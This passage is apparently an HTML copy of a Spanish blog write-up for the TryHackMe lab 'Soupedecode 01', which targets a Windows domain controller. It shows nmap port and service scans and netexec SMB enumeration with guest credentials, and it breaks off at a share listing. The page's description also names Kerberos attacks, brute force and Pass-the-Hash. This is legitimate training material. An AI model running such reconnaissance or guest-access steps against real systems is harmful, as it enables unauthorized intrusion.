<!DOCTYPE html>
<html lang="es">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  Soupedecode 01 CTF · 0xDaveey
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="David León">
<meta name="description" content="

  Máquina Soupedecode 01
  
    
    Link to heading
  

Dificultad: Fácil
Descripción: Soupedecode es un desafío intenso y apasionante en el que los jugadores deben comprometer un controlador de dominio explotando la autenticación Kerberos, accediendo a recursos compartidos SMB, realizando ataques de fuerza bruta contra contraseñas y utilizando técnicas de Pass-the-Hash. Prepárate para poner a prueba tus habilidades y estrategias en esta aventura de ciberseguridad multifacética.

  Enumeración
  
    
    Link to heading
  

">
<meta name="keywords" content="blog,hacking,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Soupedecode 01 CTF">
  <meta name="twitter:description" content="Máquina Soupedecode 01Link to headingDificultad: Fácil
Descripción: Soupedecode es un desafío intenso y apasionante en el que los jugadores deben comprometer un controlador de dominio explotando la autenticación Kerberos, accediendo a recursos compartidos SMB, realizando ataques de fuerza bruta contra contraseñas y utilizando técnicas de Pass-the-Hash. Prepárate para poner a prueba tus habilidades y estrategias en esta aventura de ciberseguridad multifacética.
EnumeraciónLink to heading">

<meta property="og:url" content="http://localhost:1313/posts/soupedecode01/">
  <meta property="og:site_name" content="0xDaveey">
  <meta property="og:title" content="Soupedecode 01 CTF">
  <meta property="og:description" content="Máquina Soupedecode 01Link to headingDificultad: Fácil
Descripción: Soupedecode es un desafío intenso y apasionante en el que los jugadores deben comprometer un controlador de dominio explotando la autenticación Kerberos, accediendo a recursos compartidos SMB, realizando ataques de fuerza bruta contra contraseñas y utilizando técnicas de Pass-the-Hash. Prepárate para poner a prueba tus habilidades y estrategias en esta aventura de ciberseguridad multifacética.
EnumeraciónLink to heading">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-14T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-14T00:00:00+00:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Window">
    <meta property="article:tag" content="Easy">
    <meta property="article:tag" content="TryHackMe">
      <meta property="og:see_also" content="http://localhost:1313/posts/billing/">
      <meta property="og:see_also" content="http://localhost:1313/posts/publisher/">
      <meta property="og:see_also" content="http://localhost:1313/posts/blueprint/">
      <meta property="og:see_also" content="http://localhost:1313/posts/bugged/">




<link rel="canonical" href="http://localhost:1313/posts/soupedecode01/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      0xDaveey
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">Sobre mí</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/projects/">Proyectos</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/contact/">Contáctame</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="http://localhost:1313/posts/soupedecode01/">
              Soupedecode 01 CTF
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-11-14T00:00:00Z">
                noviembre 14, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              12 minutos de lectura.
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/0xdaveey/">0xDaveey</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="/categories/pentesting/">Pentesting</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/ctf/">CTF</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/window/">Window</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/easy/">Easy</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/tryhackme/">TryHackMe</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p><img src="/images/posts/soupedecode01/soupedecode01.png" alt=""></p>
<h1 id="máquina-soupedecode-01">
  Máquina Soupedecode 01
  <a class="heading-link" href="#m%c3%a1quina-soupedecode-01">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>Dificultad</strong>: <em>Fácil</em></p>
<p><strong>Descripción</strong>: Soupedecode es un desafío intenso y apasionante en el que los jugadores deben comprometer un controlador de dominio explotando la autenticación Kerberos, accediendo a recursos compartidos SMB, realizando ataques de fuerza bruta contra contraseñas y utilizando técnicas de Pass-the-Hash. Prepárate para poner a prueba tus habilidades y estrategias en esta aventura de ciberseguridad multifacética.</p>
<h1 id="enumeración">
  Enumeración
  <a class="heading-link" href="#enumeraci%c3%b3n">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><img src="/images/gifs/a.gif" alt=""></p>
<p>Ejecutamos un mapeo de puertos y detección de servicios y sus versiones:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="vg">$target</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">/</span><span class="n">allPorts</span>     
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">14</span> <span class="mi">18</span><span class="p">:</span><span class="mi">42</span> <span class="no">EST</span>
</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>
</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">29</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">65517</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="n">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
</span></span><span class="line"><span class="cl"><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
</span></span><span class="line"><span class="cl"><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
</span></span><span class="line"><span class="cl"><span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span>
</span></span><span class="line"><span class="cl"><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49670</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49709</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49808</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">3389</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49670</span><span class="p">,</span><span class="mi">49671</span><span class="p">,</span><span class="mi">49709</span><span class="p">,</span><span class="mi">49808</span> <span class="o">-</span><span class="n">sCV</span> <span class="vg">$target</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span>
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">14</span> <span class="mi">18</span><span class="p">:</span><span class="mi">45</span> <span class="no">EST</span>
</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>
</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">23</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">VERSION</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="no">Simple</span> <span class="no">DNS</span> <span class="no">Plus</span>
</span></span><span class="line"><span class="cl"><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="ss">time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">14</span> <span class="mi">23</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">33</span><span class="n">Z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="ss">Domain</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL0</span><span class="o">.</span><span class="p">,</span> <span class="ss">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5?</span>
</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mi">1</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">tcpwrapped</span>
</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="ss">Domain</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL0</span><span class="o">.</span><span class="p">,</span> <span class="ss">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>
</span></span><span class="line"><span class="cl"><span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="no">Microsoft</span> <span class="no">Terminal</span> <span class="no">Services</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="ss">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">14</span><span class="ss">T23</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mo">07</span><span class="o">+</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">-</span><span class="mi">1</span><span class="n">s</span> <span class="n">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="ss">cert</span><span class="p">:</span> <span class="ss">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="no">DC01</span><span class="o">.</span><span class="n">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="no">Not</span> <span class="n">valid</span> <span class="ss">before</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span><span class="ss">T21</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">42</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="ss">after</span><span class="p">:</span>  <span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">17</span><span class="ss">T21</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">42</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="ss">info</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">Target_Name</span><span class="p">:</span> <span class="no">SOUPEDECODE</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="no">SOUPEDECODE</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="no">DC01</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">DNS_Domain_Name</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">DNS_Computer_Name</span><span class="p">:</span> <span class="no">DC01</span><span class="o">.</span><span class="n">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">Product_Version</span><span class="p">:</span> <span class="mi">10</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">20348</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="ss">System_Time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">14</span><span class="ss">T23</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">25</span><span class="o">+</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">mc</span><span class="o">-</span><span class="n">nmf</span>        <span class="o">.</span><span class="n">NET</span> <span class="no">Message</span> <span class="no">Framing</span>
</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49670</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mi">1</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">49709</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49808</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">Host</span><span class="p">:</span> <span class="no">DC01</span><span class="p">;</span> <span class="ss">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="sr">
</span></span></span><span class="line"><span class="cl"><span class="sr">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="sr">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|   3:1:1: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|_    Message signing enabled and required
</span></span></span><span class="line"><span class="cl"><span class="sr">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|   date: 2025-11-14T23:46:28
</span></span></span><span class="line"><span class="cl"><span class="sr">|_  start_date: N/</span><span class="n">A</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew</span><span class="p">:</span> <span class="ss">mean</span><span class="p">:</span> <span class="o">-</span><span class="mi">2</span><span class="n">s</span><span class="p">,</span> <span class="ss">deviation</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span><span class="p">,</span> <span class="ss">median</span><span class="p">:</span> <span class="o">-</span><span class="mi">3</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span></span></span></code></pre></div>
<p>Creamos un ficherito hosts para agregarlo a nuestro /etc/hosts para no tener problemas ejecutando nuestras tools:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="vg">$target</span> <span class="o">--</span><span class="n">generate</span><span class="o">-</span><span class="n">hosts</span><span class="o">-</span><span class="n">file</span> <span class="n">hosts</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> </span></span></code></pre></div>
<p>Hacemos un mapeo al servicio SMB:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span> <span class="o">-</span><span class="n">u</span> <span class="n">guest</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="n">shares</span>                                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">guest</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Enumerated</span> <span class="n">shares</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Share</span>           <span class="no">Permissions</span>     <span class="no">Remark</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">ADMIN</span><span class="err">$</span>                          <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">backup</span>                          
